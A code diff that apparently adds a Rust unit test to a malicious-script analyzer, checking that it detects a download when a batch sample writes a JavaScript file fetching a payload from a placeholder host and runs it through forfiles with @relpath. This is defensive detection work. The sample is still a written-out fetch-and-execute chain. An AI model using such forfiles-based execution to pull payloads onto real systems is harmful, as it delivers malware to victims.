@@ -10719,6 +10719,23 @@ forfiles /p C:\Work /m *.js /c "cmd /c C:\Work\@fname@ext""#;
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn forfiles_relpath_placeholder_feeds_nested_tracked_script_execution() {
+        let script =
+            br#"echo fetch('https://forfiles-relpath.example/payload') > C:\Work\Sub\run.js
+forfiles /p C:\Work /s /m *.js /c "cmd /c C:\Work\@relpath""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://forfiles-relpath.example/payload")
+            }),
+            "forfiles @relpath did not analyze nested generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
